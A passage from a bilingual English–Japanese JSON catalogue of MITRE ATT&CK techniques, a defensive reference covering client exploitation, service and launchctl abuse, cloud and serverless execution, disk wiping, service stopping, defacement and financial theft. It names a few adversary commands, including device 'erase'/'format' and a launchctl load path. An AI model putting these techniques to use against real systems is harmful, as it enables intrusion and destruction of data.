                "description_jp": "攻撃者は、クライアント・アプリケーションのソフトウェアの脆弱性を悪用してコードを実行する可能性があります。脆弱性は、安全でないコーディング方法によってソフトウェアに存在する可能性があり、予期しない動作につながる可能性があります。攻撃者は、任意のコード実行を目的とした標的型攻撃により、特定の脆弱性を利用することができます。多くの場合、攻撃ツールキットにとって最も価値のあるエクスプロイトは、リモートシステム上でコード実行を得るために使用できるものです。ユーザは、仕事をするために一般的に使用するアプリケーションに関連するファイルが表示されることを期待するため、その有用性の高さからエクスプロイトの研究開発にとって有用なターゲットとなります。\n\nいくつかのタイプが存在する：\n\n### ブラウザベースのエクスプロイト\n\nウェブブラウザは、[Drive-by Compromise](https://attack.mitre.org/techniques/T1189)や[Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)を介した一般的な標的です。エンドポイント・システムは、通常のウェブ・ブラウジングを通じて、あるいはスピアフィッシング・メールに記載された、ウェブ・ブラウザを悪用するために敵が管理するサイトへのリンクによって、特定のユーザーが標的にされることで侵害される可能性があります。このようなサイトでは、エクスプロイトが実行されるためにユーザがアクションを起こす必要はないことが多い。\n\n### オフィスアプリケーション\n\nMicrosoft Officeなどの一般的なオフィスアプリケーションや生産性アプリケーションも、[フィッシング](https://attack.mitre.org/techniques/T1566)の標的になっています。悪意のあるファイルは、添付ファイルとして直接送信されるか、ダウンロード用のリンクを通じて送信されます。これらは、エクスプロイトを実行するために、ユーザがドキュメントやファイルを開くことを要求します。\n\n### 一般的なサードパーティ製アプリケーション\n\nターゲットとなるネットワークに配備されているソフトウェアの一部として、一般的に見受けられるその他のアプリケーションも悪用に使用される可能性があります。Adobe Reader や Flash のようなアプリケーションは、企業環境では一般的であり、システムへのアクセスを試みる敵対者に日常的に狙われています。ソフトウェアや脆弱性の性質にもよりますが、ブラウザー上で悪用されるものもあれば、ユーザーがファイルを開くことを要求するものもあります。例えば、一部のFlashエクスプロイトは、Microsoft Office文書内のオブジェクトとして配信されている。",
                "subtechniques": []
            },
            {
                "id": "T1569",
                "name_eng": "System Services",
                "name_jp": "システムサービス",
                "description_eng": "Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.",
                "description_jp": "攻撃者は、コマンドやプログラムを実行するために、システムサービスやデーモンを悪用する可能性があります。攻撃者は、ローカルまたはリモートでサービスと相互作用したり、サービスを作成したりすることで、悪意のあるコンテンツを実行することができます。多くのサービスはブート時に実行されるように設定されており、永続性([Create or Modify System Process](https://attack.mitre.org/techniques/T1543))を達成するのに役立ちますが、敵対者は1回限りの実行や一時的な実行のためにサービスを悪用することもできます。",
                "subtechniques": [
                    {
                        "id": "T1569.003",
                        "name_eng": "Systemctl",
                        "name_jp": "システムctl",
                        "description_eng": "Adversaries may abuse systemctl to execute commands or programs. Systemctl is the primary interface for systemd, the Linux init system and service manager. Typically invoked from a shell, Systemctl can also be integrated into scripts or applications.   \n\nAdversaries may use systemctl to execute commands or programs as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s. Common subcommands include: `systemctl start`, `systemctl stop`, `systemctl enable`, `systemctl disable`, and `systemctl status`.(Citation: Red Hat Systemctl 2022)",
                        "description_jp": "攻撃者は systemctl を悪用してコマンドやプログラムを実行する可能性がある。Systemctl は、Linux の init システムでありサービスマネージャである systemd の主要なインターフェースです。通常はシェルから呼び出されますが、Systemctl はスクリプトやアプリケーションに統合することもできます。   \n\n攻撃者は systemctl を使って [Systemd Service](https://attack.mitre.org/techniques/T1543/002) としてコマンドやプログラムを実行するかもしれません。一般的なサブコマンドは以下の通りです：systemctl start`、`systemctl stop`、`systemctl enable`、`systemctl disable`、`systemctl status`などだ(引用: Red Hat Systemctl 2022)"
                    },
                    {
                        "id": "T1569.002",
                        "name_eng": "Service Execution",
                        "name_jp": "サービス実行",
                        "description_eng": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).\n\n[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.",
                        "description_jp": "攻撃者はWindowsサービスコントロールマネージャーを悪用し、悪意のあるコマンドやペイロードを実行する可能性がある。Windowsサービスコントロールマネージャ(<code>services.exe</code>)は、サービスを管理・操作するためのインターフェースである(引用: Microsoft Service Control Manager)。サービスコントロールマネージャは、<code>sc.exe</code>や[Net](https://attack.mitre.org/software/S0039)などのシステムユーティリティだけでなく、GUIコンポーネントからもアクセスできる。\n\n(引用: Russinovich Sysinternals) [PsExec](https://attack.mitre.org/software/S0029) や <code>sc.exe</code> のようなツールは、引数としてリモートサーバーを受け入れることができ、リモート実行を行うために使用することができます。\n\n攻撃者はこれらのメカニズムを利用して悪意のあるコンテンツを実行する可能性があります。これは、新しいサービスを実行するか、変更されたサービスを実行することで可能です。このテクニックは、サービスの永続化や特権昇格の際に[Windows Service](https://attack.mitre.org/techniques/T1543/003)と組み合わせて使用される実行です。"
                    },
                    {
                        "id": "T1569.001",
                        "name_eng": "Launchctl",
                        "name_jp": "Launchctl",
                        "description_eng": "Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)\n\nAdversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> or <code>/bin/launchctl load</code> to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)",
                        "description_jp": "攻撃者はlaunchctlを悪用してコマンドやプログラムを実行する可能性がある。Launchctlは、macOSのサービス管理フレームワークであるlaunchdとインターフェースをとる。Launchctlは、コマンドライン、インタラクティブ、あるいは標準入力からのリダイレクトでサブコマンドを実行することができる。 引用：Launchctl Man\n\n攻撃者はlaunchctlを使って、[Launch Agent](https://attack.mitre.org/techniques/T1543/001)や[Launch Daemon](https://attack.mitre.org/techniques/T1543/004)としてコマンドやプログラムを実行する。一般的なサブコマンドは以下の通りです：<code>launchctl load</code>、<code>launchctl unload</code>、<code>launchctl start</code>。攻撃者は、スクリプトを使用するか、コマンド <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> または <code>/bin/launchctl load</code> を手動で実行して、[Launch Agent](https://attack.mitre.org/techniques/T1543/001) または [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) を実行することができます。(引用: Sofacy Komplex Trojan)(引用: 20 macOS Common Tools and Techniques)"
                    }
                ]
            },
            {
                "id": "T1651",
                "name_eng": "Cloud Administration Command",
                "name_jp": "クラウド管理コマンド",
                "description_eng": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment’s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "description_jp": "攻撃者は、クラウド管理サービスを悪用して仮想マシン内でコマンドを実行する可能性があります。AWS Systems Manager、Azure RunCommand、Runbooksなどのリソースは、インストールされた仮想マシンエージェントを活用することで、ユーザーが仮想マシン内でスクリプトをリモート実行することを可能にする。(引用：AWS Systems Manager Run Command）（引用：Microsoft Run Command）\n\n敵対者がクラウド環境への管理者アクセスを獲得した場合、クラウド管理サービスを悪用して環境の仮想マシンでコマンドを実行できる可能性があります。さらに、サービスプロバイダまたは委任された管理者アカウントを侵害する敵対者も同様に、[Trusted Relationship](https://attack.mitre.org/techniques/T1199)を活用して、接続された仮想マシンでコマンドを実行できる可能性があります。(引用：MSTIC Nobelium Oct 2021)",
                "subtechniques": []
            },
            {
                "id": "T1648",
                "name_eng": "Serverless Execution",
                "name_jp": "サーバーレス実行",
                "description_eng": "Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. \n\nAdversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. [Resource Hijacking](https://attack.mitre.org/techniques/T1496)).(Citation: Cado Security Denonia) Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission in Google Cloud to add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to a serverless cloud function, which may then be able to perform actions the original user cannot.(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Rhingo Security Labs GCP Privilege Escalation)\n\nServerless functions can also be invoked in response to cloud events (i.e. [Event Triggered Execution](https://attack.mitre.org/techniques/T1546)), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created.(Citation: Backdooring an AWS account) This is also possible in many cloud-based office application suites. For example, in Microsoft 365 environments, an adversary may create a Power Automate workflow that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001) In Google Workspace environments, they may instead create an Apps Script that exfiltrates a user's data when they open a file.(Citation: Cloud Hack Tricks GWS Apps Script)(Citation: OWN-CERT Google App Script 2024)",
                "description_jp": "攻撃者はサーバーレス・コンピューティング、統合、自動化サービスを悪用して、クラウド環境で任意のコードを実行する可能性がある。多くのクラウドプロバイダーは、コンピュートエンジン、アプリケーション統合サービス、ウェブサーバーなど、様々なサーバーレスリソースを提供している。\n\n攻撃者は、任意のコマンドを実行する手段として、様々な方法でこれらのリソースを悪用する可能性がある。例えば、敵対者はサーバーレスの機能を利用して、暗号マイニングマルウェアなどの悪意のあるコードを実行する可能性があります（すなわち、[Resource Hijacking](https://attack.mitre.org/techniques/T1496)）。（引用：Cado Security Denonia）また、敵対者はクラウド環境のさらなる侵害を可能にする機能を作成する可能性もあります。例えば、敵はAWSの`IAM:PassRole`権限やGoogle Cloudの`iam.serviceAccounts.actAs`権限を使用して、サーバーレスのクラウド機能に[追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003)を追加し、元のユーザーができないアクションを実行できるようにすることができる。(引用: Rhino Security Labs AWS Privilege Escalation)(Citation: Rhingo Security Labs GCP Privilege Escalation)\n\nサーバーレスの関数は、クラウドのイベントに応じて呼び出すこともでき（すなわち[Event Triggered Execution](https://attack.mitre.org/techniques/T1546)）、時間経過に伴う永続的な実行を可能にする可能性がある。例えば、AWS環境では、敵はユーザーに[Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001)を自動的に追加するLambda関数と、新しいユーザーが作成されるたびにその関数を呼び出す対応するCloudWatchイベントルールを作成することができる(引用：Backdooring an AWS account)。例えば、Microsoft 365 環境では、敵対者は、ユーザーが SharePoint のドキュメントへのアクセスを許可されるたびに、ユーザーが受信するすべての電子メールを転送したり、匿名共有リンクを作成したりする Power Automate ワークフローを作成する可能性がある(引用：Varonis Power Automate Data Exfiltration)(引用：Microsoft DART Case Report 001) Google Workspace 環境では、代わりに、ファイルを開いたときにユーザーのデータを流出させる Apps Script を作成する可能性がある(引用：Cloud Hack Tricks GWS Apps Script)(引用：OWN-CERT Google App Script 2024)",
                "subtechniques": []
            }
        ]
    },
    {
        "id": "TA0040",
        "name_eng": "Impact",
        "name_jp": "インパクト",
        "description_eng": "The adversary is trying to manipulate, interrupt, or destroy your systems and data.\n \nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries’ goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.",
        "description_jp": "敵はあなたのシステムやデータを操作、妨害、破壊しようとしている。\n \nインパクトは、敵対者がビジネスおよび運用プロセスを操作することによって、可用性を妨害したり、完全性を損なったりするために使用する技術で構成されます。インパクトに使用されるテクニックには、データの破壊や改ざんが含まれます。場合によっては、ビジネス・プロセスは正常であるように見えても、敵対者の目的に資するように改ざんされている可能性があります。これらのテクニックは、敵対者が最終目標を達成するため、あるいは機密保持違反の隠れ蓑として使用される可能性があります。",
        "techniques": [
            {
                "id": "T1561",
                "name_eng": "Disk Wipe",
                "name_jp": "ディスクワイプ",
                "description_eng": "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)\n\nOn network devices, adversaries may wipe configuration files and other data from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `erase`.(Citation: erase_cmd_cisco)",
                "description_jp": "敵対者は、システムやネットワーク・リソースの可用性を妨害するために、特定のシステム上やネットワーク上の大量のディスクの生データを消去したり、破損させたりすることがある。ディスクへの直接書き込みアクセスにより、敵はディスクデータの一部を上書きしようとするかもしれない。攻撃者は、ディスク・データの任意の部分のワイプや、マスター・ブート・レコード（MBR）のようなディスク構造のワイプを選択することができる。すべてのディスク・セクタの完全なワイプが試みられるかもしれない。\n\nネットワーク全体の可用性の中断が目標とされる運用において、標的組織への影響を最大化するために、ディスクのワイプに使用されるマルウェアは、[有効なアカウント](https://attack.mitre.org/techniques/T1078)、[OSクレデンシャルダンプ](https://attack.mitre.org/techniques/T1003)、[SMB/Windows管理者共有](https://attack.mitre.org/techniques/T1021/002)などの追加テクニックを活用することで、ネットワーク全体に伝播するワームのような機能を備えている場合があります。(引用：Novetta Blockbuster 破壊的マルウェア)\n\nネットワークデバイスでは、[Network Device CLI](https://attack.mitre.org/techniques/T1059/008)の`erase`などのコマンドを使用して、デバイスから設定ファイルやその他のデータを消去する可能性がある(引用：erase_cmd_cisco)。",
                "subtechniques": [
                    {
                        "id": "T1561.002",
                        "name_eng": "Disk Structure Wipe",
                        "name_jp": "ディスク構造のワイプ",
                        "description_eng": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                        "description_jp": "攻撃者は、システムの起動に必要なハードディスク・ドライブ上のディスク・データ構造を破壊したり、消去したりすることがある。特定の重要なシステムをターゲットにしたり、システムおよびネットワーク・リソースの可用性を妨害するために、ネットワーク内の多数のシステムをターゲットにしたりする。\n\n攻撃者は、マスターブートレコード（MBR）やパーティションテーブルなどの構造にある重要なデータを上書きすることで、システムを起動不能にしようとする可能性があります（引用：Symantec Shamoon 2012）（引用：FireEye Shamoon Nov 2016）（引用：Palo Alto Shamoon Nov 2016）（引用：Kaspersky StoneDrill 2017）（引用：Unit 42 Shamoon3 2018）ディスク構造に含まれるデータには、オペレーティングシステムをロードするための初期実行コードや、ディスク上のファイルシステムパーティションの位置が含まれる場合があります。この情報が存在しない場合、コンピュータは起動プロセス中にオペレーティングシステムをロードすることができず、コンピュータを使用できない状態にする。[ディスク構造ワイプ](https://attack.mitre.org/techniques/T1561/002) は、単独で実行することもできますが、ディスクのすべてのセクタをワイプする場合は、[ディスク内容ワイプ](https://attack.mitre.org/techniques/T1561/001) と一緒に実行することもできます。\n\nネットワークデバイスでは、[Network Device CLI](https://attack.mitre.org/techniques/T1059/008) の `format` などのコマンドを使用して、ファイルシステムを再フォーマットすることができる(引用：format_cmd_cisco)。\n\n標的組織への影響を最大化するために、ディスク構造を破壊するように設計されたマルウェアは、[Valid Accounts](https://attack.mitre.org/techniques/T1078)、[OS Credential Dumping](https://attack.mitre.org/techniques/T1003)、[SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002)などの他のテクニックを活用することで、ネットワーク全体に伝播するワームのような機能を備えている場合があります。(引用: Symantec Shamoon 2012)(引用: FireEye Shamoon Nov 2016)(引用: Palo Alto Shamoon Nov 2016)(引用: Kaspersky StoneDrill 2017)"
                    },
                    {
                        "id": "T1561.001",
                        "name_eng": "Disk Content Wipe",
                        "name_jp": "ディスク・コンテンツのワイプ",
                        "description_eng": "Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have also been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)",
                        "description_jp": "攻撃者は、システムやネットワーク・リソースの可用性を妨害するために、特定のシステム上やネットワーク上の大量のストレージ・デバイスの内容を消去することがある。\n\n敵対者は、ストレージ・デバイスのコンテンツを部分的または完全に上書きし、ストレージ・インターフェイスを通じてデータを回復不能にする可能性があります（引用：Novetta Blockbuster）（引用：Novetta Blockbuster 破壊的マルウェア）（引用：DOJ Lazarus Sony 2018）特定のディスク構造やファイルを消去する代わりに、破壊的な意図を持つ敵対者は、ディスク・コンテンツの任意の部分を消去する可能性があります。ディスクコンテンツを消去するために、敵対者はディスクの任意のサイズの部分をランダムなデータで上書きするために、ハードドライブへの直接アクセスを取得することがあります(引用：Novetta Blockbuster 破壊的マルウェア)。敵対者はまた、ディスクコンテンツに直接アクセスするために[RawDisk](https://attack.mitre.org/software/S0364)のようなサードパーティのドライバを活用することが観察されています(引用：Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)。この動作は、個々のファイルではなくディスクのセクションが消去されるため、[Data Destruction](https://attack.mitre.org/techniques/T1485)とは異なります。\n\nネットワーク全体の可用性の中断が目標とされる運用において、標的組織への影響を最大化するために、ディスクコンテンツの消去に使用されるマルウェアは、[有効なアカウント](https://attack.mitre.org/techniques/T1078)、[OSクレデンシャルのダンプ](https://attack.mitre.org/techniques/T1003)、[SMB/Windows管理者共有](https://attack.mitre.org/techniques/T1021/002)などの追加のテクニックを活用することで、ネットワーク全体に伝播するワームのような機能を備えている場合があります(引用: Novetta Blockbuster 破壊的マルウェア)。"
                    }
                ]
            },
            {
                "id": "T1489",
                "name_eng": "Service Stop",
                "name_jp": "サービス・ストップ",
                "description_eng": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible.(Citation: Novetta Blockbuster) In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server, or on virtual machines hosted on ESXi infrastructure.(Citation: SecureWorks WannaCry Analysis)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)",
                "description_jp": "敵対者は、システム上のサービスを停止または無効化して、正当なユーザーがそれらのサービスを利用できないようにすることがある。重要なサービスやプロセスを停止させることで、インシデントへの対応を阻害または停止させたり、環境に損害を与えるという敵対者の全体的な目的を支援したりすることができる。 引用：Talos Olympic Destroyer 2018）（引用：Novetta Blockbuster\n\n敵対者は、<code>MSExchangeIS</code>のような組織にとって重要度の高い個々のサービスを無効化することでこれを達成し、Exchange コンテンツにアクセスできなくすることがあります(引用: Novetta Blockbuster)。 場合によっては、敵対者はシステムを使用不能にするために、多くのサービスまたはすべてのサービスを停止または無効化することがあります(引用: Talos Olympic Destroyer 2018)。 サービスまたはプロセスは、実行中にそのデータストアの変更を許可しないことがあります。敵対者は、ExchangeやSQL Serverなどのサービスや、ESXiインフラストラクチャ上でホストされている仮想マシンのデータストアに対して、[Data Destruction](https://attack.mitre.org/techniques/T1485)または[Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486)を実行するために、サービスやプロセスを停止する可能性があります(引用: SecureWorks WannaCry Analysis)(引用: Crowdstrike Hypervisor Jackpotting Pt 2 2021)。",
                "subtechniques": []
            },
            {
                "id": "T1491",
                "name_eng": "Defacement",
                "name_jp": "汚損",
                "description_eng": "Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause user discomfort, or to pressure compliance with accompanying messages.",
                "description_jp": "攻撃者は、企業ネットワークの内部または外部で利用可能なビジュアルコンテンツを変更し、元のコンテンツの完全性に影響を与える可能性があります。Defacement](https://attack.mitre.org/techniques/T1491)の理由には、メッセージの配信、脅迫、侵入に対する（おそらく虚偽の）信用主張などが含まれる。ユーザを不快にさせるため、あるいは付随するメッセージへの準拠を迫るために、[Defacement](https://attack.mitre.org/techniques/T1491)の一部として不穏な画像や攻撃的な画像が使用されることがある。",
                "subtechniques": [
                    {
                        "id": "T1491.002",
                        "name_eng": "External Defacement",
                        "name_jp": "外部への汚損",
                        "description_eng": "An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002) may ultimately cause users to distrust the systems and to question/discredit the system’s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement)",
                        "description_jp": "敵対者は、メッセージの伝達、威嚇、あるいは組織やユーザーを欺く目的で、組織の外部のシス テムを改ざんすることがある。[外部改ざん](https://attack.mitre.org/techniques/T1491/002)は、最終的にユーザにシステムに対する不信感を抱かせ、システムの完全性を疑わせたり信用させなくさせたりする。外部向けのウェブサイトは、改ざんの一般的な被害者である。政治的メッセージを押し出したり、プロパガンダを広めたりするために、敵対勢力やハクティビスト・グループによって標的にされることが多い。（引用：FireEye Cyber Threats to Media Industries）（引用：Kevin Mandia Statement to US Senate Committee on Intelligence）（引用：Anonymous Hackers Deface Russian Govt Site） [External Defacement](https://attack.mitre.org/techniques/T1491/002) は、イベントを引き起こすきっかけとして、または組織や政府による行動に対する反応として使用されることがある。同様に、Webサイトの改ざんは、[Drive-by Compromise](https://attack.mitre.org/techniques/T1189)のような将来の攻撃のセットアップや前兆として使用されることもあります。(引用: Trend Micro Deep Dive Into Defacement)"
                    },
                    {
                        "id": "T1491.001",
                        "name_eng": "Internal Defacement",
                        "name_jp": "内部汚損",
                        "description_eng": "An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites or server login messages, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster)(Citation: Varonis) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)",
                        "description_jp": "敵対者は、ユーザーを威嚇したり、誤解させたりするために、組織内部のシステムを改ざんし、システムの完全性を失墜させる可能性がある。これは、社内のウェブサイトやサーバーのログインメッセージに変更を加えたり、デスクトップの壁紙を置き換えたりして、ユーザーシステムに直接手を加えるという形を取ることがある。(引用：Novetta Blockbuster)(引用：Varonis) ユーザーを不快にさせたり、付随するメッセージへのコンプライアンスを強要したりするために、[Internal Defacement](https://attack.mitre.org/techniques/T1491/001)の一部として、不穏な画像や攻撃的な画像が使用されることがある。システムの内部改ざんは敵対者の存在を露呈させるため、他の侵入目的が達成された後に行われることが多い(引用：Novetta Blockbuster Destructive Malware)"
                    }
                ]
            },
            {
                "id": "T1657",
                "name_eng": "Financial Theft",
                "name_jp": "金融窃盗",
                "description_eng": "Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware,(Citation: FBI-ransomware) business email compromise (BEC) and fraud,(Citation: FBI-BEC) \"pig butchering,\"(Citation: wired-pig butchering) bank hacking,(Citation: DOJ-DPRK Heist) and exploiting cryptocurrency networks.(Citation: BBC-Ronin) \n\nAdversaries may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) to conduct unauthorized transfers of funds.(Citation: Internet crime report 2022) In the case of business email compromise or email fraud, an adversary may utilize [Impersonation](https://attack.mitre.org/techniques/T1656) of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary.(Citation: FBI-BEC) This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft.(Citation: VEC)\n\nExtortion by ransomware may occur, for example, when an adversary demands payment from a victim after [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) (Citation: NYT-Colonial) and [Exfiltration](https://attack.mitre.org/tactics/TA0010) of data, followed by threatening to leak sensitive data to the public unless payment is made to the adversary.(Citation: Mandiant-leaks) Adversaries may use dedicated leak sites to distribute victim data.(Citation: Crowdstrike-leaks)\n\nDue to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and business disruption.(Citation: AP-NotPetya)",
